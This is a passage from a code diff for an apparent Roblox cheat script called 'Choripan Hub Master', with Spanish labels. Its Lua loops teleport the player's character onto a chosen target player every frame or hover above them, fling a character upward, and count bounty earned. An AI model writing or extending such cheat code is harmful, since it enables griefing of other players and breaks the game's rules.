+                        hrp.CFrame = hrp.CFrame * CFrame.new(0, 273861, 0)
+                        task.wait(0.01)
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+-- [[ 🔄 MAIN LOOPS ]]
+task.spawn(function()
+    StartBounty = getBounty()
+    while task.wait(1) do
+        LabelEarned:Set("Ganado: " .. (getBounty() - StartBounty))
+    end
+end)
+
+-- RenderStepped unificado (Insta TP y Modo Aéreo)
+RunService.RenderStepped:Connect(function(dt)
+    if SelectedPlayer and SelectedPlayer ~= "" then
+        pcall(function()
+            local targetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local myChar = LP.Character
+                if myChar and myChar:FindFirstChild("HumanoidRootPart") then
+                    if InstaTeleportEnabled then
+                        myChar.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+                    elseif ModoAereoEnabled then
+                        myChar.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10, 2)
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+Rayfield:Notify({Title = "🌭 Choripan Hub Master", Content = "Vuelo suave sin Lag activado.", Duration = 6})
